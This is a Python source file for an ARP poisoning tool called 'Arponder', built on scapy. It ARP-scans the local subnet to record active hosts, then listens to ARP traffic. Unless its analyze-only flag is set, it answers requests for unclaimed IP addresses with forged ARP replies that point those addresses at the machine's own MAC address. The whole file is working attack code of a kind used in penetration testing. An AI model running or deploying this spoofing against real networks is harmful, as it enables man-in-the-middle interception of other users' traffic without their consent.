from scapy.all import sniff, ARP, get_if_hwaddr, get_if_addr, srp, Ether, sendp
import ipaddress
import netifaces
from colorama import Fore


class Arponder():
    def __init__(self, net_interface: str, analyze_only=False, debug=False):
        self.net_interface = net_interface
        self.debug = debug
        self.analyze_only = analyze_only
        self.active_hosts = {}

        # Parse interface info
        self.interface_mac = get_if_hwaddr(self.net_interface)
        self.ip = get_if_addr(self.net_interface)
        self.interface_addrs = netifaces.ifaddresses(self.net_interface)
        self.netmask = self.interface_addrs[netifaces.AF_INET][0]['netmask']
        self.network = ipaddress.ip_network(f"{self.ip}/{self.netmask}", strict=False)

    def start_listener(self):
        """
        ARP Scan the local network and starts sniffing ARP
        packets on the specified network interface.

        Will run until manually stopped (e.g., Ctrl+C).
        """
        self.__scan_local_subnet()

        print(f"[-] Starting ARP listener on {self.net_interface}")
        sniff(iface=self.net_interface, filter="arp", prn=self.__arp_callback, store=0)

    def __arp_callback(self, packet):
        """Private method to handle each ARP packet as it's captured."""

        if ARP in packet and packet[ARP].hwsrc != self.interface_mac:
            if packet[ARP].op in (1, 2):
                if packet[ARP].op == 1:
                    # ARP Request (who-has)
                    source_mac = packet[ARP].hwsrc
                    requested_ip = packet[ARP].pdst
                    if self.debug:
                        print(f"  [-] ARP request from {source_mac} for {requested_ip}")

                    # Poison if not in analyze_only mode
                    if not self.analyze_only and requested_ip not in self.active_hosts:
                        requestor_ip = packet[ARP].psrc
                        requestor_mac = packet[ARP].hwsrc
                        poison_reply = Ether(dst=requestor_mac)/ARP(
                            op=2,
                            psrc=requested_ip,
                            hwsrc=self.interface_mac,
                            pdst=requestor_ip,
                            hwdst=requestor_mac
                        )
                        sendp(poison_reply, iface=self.net_interface, verbose=0)
                        print(Fore.LIGHTRED_EX + f"  [+] Sent ARP poison reply to {requestor_ip} for {requested_ip}" + Fore.RESET)
                else:
                    # ARP Reply (is-at)
                    from_mac = packet[ARP].hwsrc
                    source_ip = packet[ARP].psrc
                    if self.debug:
                        print(f"  [-] {from_mac} says {source_ip} is at {from_mac}")

                    # Add the discovered host to active_hosts (always)
                    if source_ip not in self.active_hosts:
                        self.active_hosts[source_ip] = from_mac

    def __scan_local_subnet(self):
        """
        Scans the local subnet for active hosts using ARP.
        """

        print(f"[-] Scanning network: {self.network} for active hosts...")
        answered, unanswered = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(self.network)),
            timeout=2,
            iface=self.net_interface,
            verbose=0
        )

        # Parse discovered hosts
        for snd, rcv in answered:
            responding_ip = rcv.psrc
            responding_mac = rcv.hwsrc

            if responding_ip not in self.active_hosts:
                self.active_hosts[responding_ip] = responding_mac

            if self.debug:
                print(f"  [+] Host {responding_ip} is alive at {responding_mac}")